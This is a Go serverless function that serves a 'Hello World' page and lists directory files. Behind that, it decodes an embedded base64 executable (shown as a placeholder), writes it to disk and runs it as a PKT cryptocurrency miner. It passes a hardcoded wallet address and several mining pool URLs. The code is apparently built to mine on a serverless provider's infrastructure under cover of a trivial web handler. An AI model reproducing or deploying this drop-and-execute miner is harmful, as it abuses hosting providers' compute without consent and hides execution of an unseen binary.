package handler

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
)

func Handler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "<h1>Hello World from Golang serverless</h1>")

	// Display current directory
	currentDir, err := os.Getwd()
	if err != nil {
		fmt.Fprintf(w, "Error getting current directory: %v", err)
		return
	}
	fmt.Fprintf(w, "<p>Current Directory: %s</p>", currentDir)

	// List files in current directory
	files, err := ioutil.ReadDir(currentDir)
	if err != nil {
		fmt.Fprintf(w, "Error listing files: %v", err)
		return
	}

	fmt.Fprintf(w, "<h2>Files:</h2>")
	fmt.Fprintf(w, "<ul>")
	for _, file := range files {
		fmt.Fprintf(w, "<li>%s</li>", file.Name())
	}
	fmt.Fprintf(w, "</ul>")

	// Base64 string representing the executable
	base64String := "BASE64_STRING_GOES_HERE"

	// Convert base64 string to bytes
	decodedBytes, err := base64.StdEncoding.DecodeString(base64String)
	if err != nil {
		fmt.Fprintf(w, "Error decoding base64 string: %v", err)
		return
	}

	// Write the bytes to a file
	exePath := filepath.Join(currentDir, "executable")
	err = ioutil.WriteFile(exePath, decodedBytes, 0755)
	if err != nil {
		fmt.Fprintf(w, "Error writing executable file: %v", err)
		return
	}

	// Execute the executable with arguments
	cmd := exec.Command(exePath, "ann", "-p", "pkt1qrup75sh882mea577x9r9q6ka8j8rzlqdzazlqg", "http://pool.pkt.world/master/min4096", "https://stratum.zetahash.com/d/4096", "http://pool.pkteer.com", "http://pool.pktpool.io")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		fmt.Fprintf(w, "Error executing the executable: %v", err)
		return
	}
}

